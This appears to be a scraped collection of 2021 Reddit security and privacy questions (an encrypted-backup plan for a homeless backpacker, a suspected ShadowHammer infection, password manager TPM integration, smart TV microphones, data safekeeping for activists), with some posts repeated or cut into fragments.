> Pw2 for encryption of zip file - I will access this from an untrusted computer/phone after my things are stolen. This device could belong to a hotel, stranger or police. It has things to help me prove my ID and access money to buy local clean phone and computer so I can access all vaults and continue my life as if nothing happened. Zip because I might not able to install the software to unlock a vault.
> 
> That's it. I just need to remember 3 passwords. Vaults and zip are encrypted and synced to clouds. First cloud works with Cryptomator and syncs instantly when there's connection. Second cloud works with an *alternative* to Cryptomator (in case of data corruption, Cryptomator software bug) and syncs *once a month* (in case instant sync fails and also kind of as an older backup). I don't remember needing versioning in backups in last 15 years. *Two clouds* because one's domain could be blocked by the local government or could lock me out or its software might fail to work when I need it to work.

> As for PW management: I use incognito browser, pay attention to SSL and domain, clear the clipboard after I copy paste a sensitive password. Using a PW manager software safely would increase complexity (gotta back that up too) and I'm not sure if I want that. I think I could keep a text file of bank, broker, government account passwords and credit card info in vault1. I'd enter passwords from computer screen to my phone manually.

I'm not trying to protect myself against the FBI and I'm not a public figure, though I earn online. I just want to protect myself enough to feel safe and relaxed, considering I am not rich, have no home, *carry all my possessions with me*, am fully reliant on internet and I'm on my own. 

Could I get your comment on this design? Is it good enough?

Some other questions:

- I don't have an alternative to Cryptomator yet. Any suggestions? 

- I'm a little worried about being dependent on terminal but, is there an idiot-proof simple script to encrypt and decrypt files individually? Or something with a GUI? Maybe something that would choose the right encryption algorithm when there's new vulnerabilities I wouldn't know about? Maybe I need two versions of this script instead of two softwares like Cryptomator.",2021-07-05

As my title suggests, I’m really concerned i have some sort of malware, keylogger or RAT on my pc. I started noticing something was off two weeks ago when i saw that theres a file called “temp” that keeps constantly being shown on my quick access section in the file explorer, it leads to an “Asus Live Update” folder. Note that i have not opened or used this service in i dont even know how long and made sure to disable it from startup a looong time ago. I search up some of the files that were recently modified online and to my horror i find they are associated with an attack called “shadowhammer”, which is what lead me to this subreddit.

 I looked up my mac address to see if it was compropmised but it said i wasnt, i still wasnt very reassured tho. I thought it was a one time thing, but the files in this folder are constantly being modified over the two week period, theyre called: idx.ini, logtrack.txt and one called cdat.tmp, the lattee of which has a .sign file with my laptop model (X451uj.sign), i opened it using an online reader and I’m not sure what to make of it. I go on the task manager to see if theres a reason this is happening and everytime i press on the performance tab, i get the blue screen of death and my pc reatarts, this still happens even now. However, one time i was able to catch a glimpse before this happened and i found i had a monitor for “Ethernet virtualbox host only network adapter”, even though i do no have a virual machines on my pc and even had virtualbox uninstalled a long time ago. I ran an ipconfig just to make sure i wasnt imaging things and it surely was there. I ran both malware bites and every scan offered by windows defender but nothing pops up for me.

3538,oc13pl,Password manager Windows Hello Integration,"Recently, I got really frustrated with trying to get enpass to work with Windows Hello. What I am seeking is not having to type my master password every time I restart the machine or enpass. For enpass, they apparently store a key in the TPM, but require TPM 2.0. However, this did not work in both of my TPM system because enpass said that they do not implement tpm key attestation properly. 

I tried Bitwarden and did not have this issue. However when I turn off Bitwarden, it still did not required me to enter the master password. This got me thinking about how each password manager handle encryption on windows and what are the pros and cons security-wise.

Here's what I notice so far from reading.

* 1password - integrates with windows hello, but does not store the key even if tpm is present. This mean when you restart 1password, you must enter master password. 1Password explain that unlike the Mac with their security enclave, there is no safe way of storing the master password key.
* Bitwarden - product can be unlock using windows hello. It probably stores the key on disk somewhere and is unlocked by windows hello. I am able to start up bitwarden and unlock it using windows hello even without tpm. 
* Dashlane - Integrates with windows Hello and does not talk about TPM requirements but apparently force you to enter the master password every 14 days as a safety measure.
* Enpass - Integrates with windows Hello and stores key in the TPM 2.0 but it has to implement TPM key attestation properly. IF this does not work, then users has to enter master password on enpass start up.
* Last Pass - does not appear to integrate with Hello but uses its own fingerprint integration. I don't think it uses TPM.

Enpass explain that on windows without TPM, you cannot safely store the master password key.  Bitwarden is mum on this. Is Enpass right though? Is storing the master password key without TPM unsafe?",2021-07-02

For example, my mother's tablet stopped working, but she is technically still connected to Gmail and such. If someone somewhere somehow puts his hand on the tablet and manages to make it work, then he can gain access to everything, since they dont ask you for your password once logged in.

3549,p6xttl,"Are there any guidelines for how much weaker your passwords/PINs can afford to be when additional layers of protection (e.g. TPM, 2FA, key files, lockout thresholds, etc.) are present?","This might be a strange question, but I'm curious what this community thinks. In practice (I know that *in theory* every password you use should be long and complex), the strength of your passwords is dependent on what additional layers of protection are available, if any. Typically you'd feel less secure using, say, a fifteen character password as a master password, but might feel comfortable using that same fifteen character password for an online account protected by 2FA.

I'm wondering whether there are any loose guidelines for determining how much less secure/long/complex your passwords can afford to be when additional layers of protection are present. Personally, I need to remember at least five unique passwords. Some are very long diceware passwords, while others are substantially shorter and easier to remember. How much I'm willing to give up in terms of security in exchange for ease of use depends on whether those passwords stand completely alone without any additional layers of protection (as an example, the password I use to sign into my main cloud account is long and complex and 2FA isn't enabled - I wanted a scenario where I know I can always log into this account, even if I were to lose my phone and laptop at the same time or something else happened that made my 2FA codes unrecoverable).

I recently enabled Bitlocker drive encryption and would like to switch from using a local account password to a local PIN backed by TPM. Because two new layers of security have been introduced on my machine - the Bitlocker drive encryption and the TPM backing available to PINs - I was considering using something easier to type and remember as my PIN, since my current local account password is a pain to type. I feel like a PIN in this scenario can afford to be shorter and less complex because of that TPM backing and lockout threshold - I just don't know how much less secure.

As a forgetful person (why I haven't switched to YubiKey) with a crap memory who's always looking for ways to make things a little simpler, I'd love to hear what this community has to say on this matter.",2021-08-18

Is it too late for me to discover where it's from or should I let myself go mad and change all passwords to all the websites I've registered in the last 6 years? (I'm joking but still...)   


Thanks for reading :) And I do hope I'm not posting this in the wrong subreddit...

I have a Bachelor's in Computer Science and I'm currently working as a dev, but I want to transition into cybersecurity and a good way to do that is to have a diploma/certifications on my resume.

3559,ovbc00,Are there any organizations where you can store digital data for safekeeping when you are a human rights defender in a country with a bad human rights record?,"I live in Bangladesh a country that has a bad reputation for not respecting the rights of people, including things such as enforced disappearances and imprisonment on false and frivolous charges of journalists, bloggers etc. THere have been anecdotal rumours of authorities getting rid of evidence.

I was wondering, are there any international NGOs, where you can have your digital data (photos, videos, audios) stored with them securely (data that may or may not have evidentiary value) for free.

I know its possible to keep the data on a cloud storage where you have the password only. But that does not help if you are somehow removed from the scene or you are prevented from accessing the internet.

I know ForbiddenStories takes upon the work of journalists who are murdered or disappeared, but they only take on big and grave issues and cases. I am looking for something that is more like a repository, where anyone can save any activism or rights related digital data (and personal data) and then have someone else take it up (if it goes that far) if you are unable to access that data.",2021-07-31

3561,ouvuiy,"Bought a Smart Google TV with a built-in mic (on the unit, not the remote). What should I do to protect my audio privacy?","**The entirety of my privacy concerns (with regards to a smart TV) amounts to this: I don't want hackers, or Google, listening to my conversations.** That's it. I personally don't care about companies tracking what content I watch or what games I play, as there isn't any information there that would be of interest to anyone. I'm not interested in arguing about what my privacy concerns should be. I'm just looking for advice on the microphone issue.

The TV I bought is a 2021 Sony Bravia X90J with Google TV. I plan on using the Google TV OS for watching YouTube and Hulu, and for sideloading Android apps. I bought this particular model for its excellent 4K HDR display and HDMI 2.1 support which I'll need to get the most out of my Xbox Series X. I was initially led to believe that the only microphone was on the remote, which I could disable by turning Bluetooth off, as that is how the [audio is transmitted](https://www.sony.com/electronics/support/televisions-projectors-lcd-tvs-android-/xr-65x90j/articles/00171448). But after looking more closely at the [documentation](https://www.sony.co.in/electronics/support/televisions-projectors-lcd-tvs-android-/xr-55x90j/articles/00201366), I've realized that there is actually a mic on the TV itself, for ""hands-free voice controls"". While this is concerning, very few TVs in my budget have HDMI 2.1 support and a well-rated display, which are my main criteria.

There is a switch to turn the mic off, and of course I plan on disabling Google Assistant and configuring all of the privacy settings on the TV to my liking. But that's all software-related, and I've heard stories of microphones being turned on remotely, which disturbs me.

Here are some safety measures that I've thought of based on discussions I've read online:

* As I've said already, disabling the mic using the button and disabling all audio features
* Having a secure WiFi password that's unlikely to be cracked
* Attaching a Pi-Hole to the network? (I'm tech-savvy enough to make one and set it up, but I don't exactly know why it's necessary or how it would help, I've just seen it mentioned a bunch.)
* Making a separate Google account so that my voice isn't tied to my identity
* (Last resort, if it's still insecure): disabling WiFi, making it a ""dumb TV"" and using other devices for streaming (although I really would have liked to sideload Android apps without having to get an extra box)

Will these be enough? Is there anything else I should do? Are some of these unnecessary? Thanks for your input.",2021-07-30

3573,oe9sx1,Is my `digital life design` good enough?,"Hi. I'm trying to organize my digital life and make it as simple as possible. I'm going to be really happy after I finalize this design. So I do appreciate your input. Especially if you are great at cyber security

Some constraints:

- I'm a full time backpacker with no home. If my things are lost/stolen, flying to a friend/relative to get my backup disk would cost too much money and the data might be too old. So I must use cloud to store my backups. 

- I don't trust any password managers, cloud providers, Apple, Google and such. Maybe they are nice today but I'm not sure what they or government would do 30 years later. I trust whatever I have control over; open source software that runs on my machine. 

Here's the design draft

> Pw0 for cloud1, cloud2
> 
> Pw0 for email account associated to clouds. Email account is created because cloud providers ask for it
> 
> Pw1 for vault1 - It has passwords, cards (purpose of separating v1 and v2 is to keep v1 usually locked)
> 
> Pw1 for vault2 - It has everything else 
> 
> Pw2 for encryption of zip file - I will access this from an untrusted computer/phone after my things are stolen. This device could belong to a hotel, stranger or police. It has things to help me prove my ID and access money to buy local clean phone and computer so I can access all vaults and continue my life as if nothing happened. Zip because I might not able to install the software to unlock a vault.
> 
> That's it. I just need to remember 3 passwords. Vaults and zip are encrypted and synced to clouds. First cloud works with Cryptomator and syncs instantly when there's connection. Second cloud works with an *alternative* to Cryptomator (in case of data corruption, Cryptomator software bug) and syncs *once a month* (in case instant sync fails and also kind of as an older backup). I don't remember needing versioning in backups in last 15 years. *Two clouds* because one's domain could be blocked by the local government or could lock me out or its software might fail to work when I need it to work.

> As for PW management: I use incognito browser, pay attention to SSL and domain, clear the clipboard after I copy paste a sensitive password. Using a PW manager software safely would increase complexity (gotta back that up too) and I'm not sure if I want that. I think I could keep a text file of bank, broker, government account passwords and credit card info in vault1. I'd enter passwords from computer screen to my phone manually.

I'm not trying to protect myself against the FBI and I'm not a public figure, though I earn online. I just want to protect myself enough to feel safe and relaxed, considering I am not rich, have no home, *carry all my possessions with me*, am fully reliant on internet and I'm on my own. 

Could I get your comment on this design? Is it good enough?

Some other questions:

- I don't have an alternative to Cryptomator yet. Any suggestions? 

- I'm a little worried about being dependent on terminal but, is there an idiot-proof simple script to encrypt and decrypt files individually? Or something with a GUI? Maybe something that would choose the right encryption algorithm when there's new vulnerabilities I wouldn't know about? Maybe I need two versions of this script instead of two softwares like Cryptomator.",2021-07-05

Note that i have not opened or used this service in i dont even know how long and made sure to disable it from startup a looong time ago. I search up some of the files that were recently modified online and to my horror i find they are associated with an attack called “shadowhammer”, which is what lead me to this subreddit.

 I looked up my mac address to see if it was compropmised but it said i wasnt, i still wasnt very reassured tho. I thought it was a one time thing, but the files in this folder are constantly being modified over the two week period, theyre called: idx.ini, logtrack.txt and one called cdat.tmp, the lattee of which has a .sign file with my laptop model (X451uj.sign), i opened it using an online reader and I’m not sure what to make of it.

For example, my mother's tablet stopped working, but she is technically still connected to Gmail and such. If someone somewhere somehow puts his hand on the tablet and manages to make it work, then he can gain access to everything, since they dont ask you for your password once logged in.

Another example, I was thinking of getting a cloud service (OneDrive) for me and my family. However, if someone steals our devices or we lose them somehow, because it connects us automatically, then it is leaving room for the stranger to steal informations or erasing everything, or even changing account securities in which we cannot get the account back.

3580,oc13pl,Password manager Windows Hello Integration,"Recently, I got really frustrated with trying to get enpass to work with Windows Hello. What I am seeking is not having to type my master password every time I restart the machine or enpass. For enpass, they apparently store a key in the TPM, but require TPM 2.0. However, this did not work in both of my TPM system because enpass said that they do not implement tpm key attestation properly. 

I tried Bitwarden and did not have this issue. However when I turn off Bitwarden, it still did not required me to enter the master password. This got me thinking about how each password manager handle encryption on windows and what are the pros and cons security-wise.

Here's what I notice so far from reading.

* 1password - integrates with windows hello, but does not store the key even if tpm is present. This mean when you restart 1password, you must enter master password. 1Password explain that unlike the Mac with their security enclave, there is no safe way of storing the master password key.
* Bitwarden - product can be unlock using windows hello. It probably stores the key on disk somewhere and is unlocked by windows hello. I am able to start up bitwarden and unlock it using windows hello even without tpm. 
* Dashlane - Integrates with windows Hello and does not talk about TPM requirements but apparently force you to enter the master password every 14 days as a safety measure.
* Enpass - Integrates with windows Hello and stores key in the TPM 2.0 but it has to implement TPM key attestation properly. IF this does not work, then users has to enter master password on enpass start up.
* Last Pass - does not appear to integrate with Hello but uses its own fingerprint integration. I don't think it uses TPM.

Enpass explain that on windows without TPM, you cannot safely store the master password key.  Bitwarden is mum on this. Is Enpass right though? Is storing the master password key without TPM unsafe?",2021-07-02
